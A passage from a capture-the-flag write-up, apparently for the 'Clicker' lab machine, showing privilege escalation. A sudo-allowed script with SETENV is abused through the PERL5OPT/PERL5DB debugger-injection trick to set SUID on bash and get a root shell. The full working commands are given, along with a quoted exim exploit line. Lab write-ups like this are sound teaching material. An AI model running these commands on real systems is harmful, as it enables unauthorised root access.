When printing the containt of the file (maybe mysql CLI), it removes the 2 last “--” since it is interpreted as comments.

Same with “-----END OPENSSH PRIVATE KEY-----”

![Untitled](assets/user_ssh.png)

## Privilege Escalation

```bash
jack@clicker:~$ sudo -l
Matching Defaults entries for jack on clicker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack may run the following commands on clicker:
    (ALL : ALL) ALL
    (root) SETENV: NOPASSWD: /opt/monitor.sh
```

```bash
cat /opt/monitor.sh
```

```bash
#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;

data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
fi
```

This script will use /usr/bin/curl, /usr/bin/echo, which are regular binaries

/usr/bin/xml_pp is a perl script that aims at pretty-print XML

Searching for a perl exploit, we can fin this :

[https://www.exploitalert.com/view-details.html?id=23687](https://www.exploitalert.com/view-details.html?id=23687)

With a reference to the perl documentation : `http://perldoc.perl.org/perlrun.html`

This is an exploit for exim with the following command line :

```ruby
cmd_exec(%Q{PERL5OPT=-d PERL5DB='exec "#{c}"' exim -ps 2>&-})
```

These options are set prior the execution :

```bash
PERL5OPT=-d PERL5DB='exec "#{c}"'
```

- PERL5DB: The command used to load the debugger code.
- The PERL5DB environment variable is only used when Perl is started with a bare ["-d"](https://perldoc.perl.org/perlrun#-d) switch.
- PERL5OPT sets the  ["-d"](https://perldoc.perl.org/perlrun#-d) switch.

So we have to set a payload to be executed prior the script.

This is called “perl_startup”

Let’s do it, with a simple payload to set SUID on bash:

```bash
sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /usr/bin/bash"' /opt/monitor.sh
```

This set the environnement variables PERL5OPT and PERL5DB under the sudo context, and call [monitor.sh](http://monitor.sh) that will then call xml_pp that will invoke perl

then get a root shell with :

```bash
bash -p
```

Get a root shell !
